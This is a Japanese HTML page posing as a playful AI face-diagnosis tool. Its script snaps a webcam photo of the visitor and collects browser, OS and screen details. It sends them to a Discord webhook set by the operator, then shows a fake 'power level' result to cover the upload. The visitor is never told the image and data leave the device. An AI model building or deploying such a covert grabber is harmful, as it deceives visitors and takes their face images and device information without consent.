<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI-GENESIS 顔診断システム</title>
    <style>
        /* サイバーパンク風デザイン */
        body { 
            font-family: 'Courier New', Courier, monospace; 
            text-align: center; 
            background-color: #0a0a0a; 
            color: #00ff00; 
            margin: 0; 
            padding: 20px;
            overflow-x: hidden;
        }
        .container {
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 20px #00ff00;
            max-width: 500px;
            margin: auto;
        }
        #video { 
            width: 100%; 
            border: 1px solid #00ff00; 
            border-radius: 10px;
            filter: grayscale(30%) brightness(1.2);
        }
        #snap { 
            margin-top: 25px; 
            padding: 15px 40px; 
            font-size: 20px; 
            font-weight: bold;
            background: transparent; 
            color: #00ff00; 
            border: 2px solid #00ff00;
            border-radius: 5px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
        }
        #snap:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 30px #00ff00;
        }
        .status-text { font-size: 12px; margin-top: 10px; color: #008800; }
    </style>
</head>
<body>

<div class="container">
    <h2>SYSTEM: AI-GENESIS</h2>
    <p>対象の生体認証を開始します...</p>
    
    <video id="video" autoplay playsinline></video>
    
    <button id="snap">SCAN START</button>
    
    <div class="status-text" id="status">STATUS: IDLE</div>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const snap = document.getElementById('snap');
    const status = document.getElementById('status');
    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // ここにURLを入れてください

    // カメラ起動
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => { video.srcObject = stream; });

    snap.addEventListener('click', () => {
        status.innerText = "STATUS: SCANNING...";
        
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        // 追加情報の取得
        const deviceData = {
            userAgent: navigator.userAgent,     // ブラウザやOSの情報
            language: navigator.language,       // 言語設定
            platform: navigator.platform,       // OSプラットフォーム
            screenSize: `${window.screen.width}x${window.screen.height}`, // 画面サイズ
            time: new Date().toLocaleString('ja-JP') // 現在時刻
        };

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('file', blob, 'scan_result.png');
            
            // Discordに送るテキストメッセージを豪華にする
            const message = {
                embeds: [{
                    title: "━━ 生体スキャン完了 ━━",
                    color: 65280, // 緑色
                    fields: [
                        { name: "時刻", value: deviceData.time, inline: true },
                        { name: "OS/Platform", value: deviceData.platform, inline: true },
                        { name: "解像度", value: deviceData.screenSize, inline: true },
                        { name: "User-Agent", value: "```" + deviceData.userAgent + "```" }
                    ]
                }]
            };
            formData.append('payload_json', JSON.stringify(message));

            fetch(webhookUrl, { method: 'POST', body: formData })
                .then(() => {
                    status.innerText = "STATUS: UPLOAD COMPLETE";
                    alert('診断結果：あなたの戦闘力は 530,000 です。');
                });
        }, 'image/png');
    });
</script>

</body>
</html>
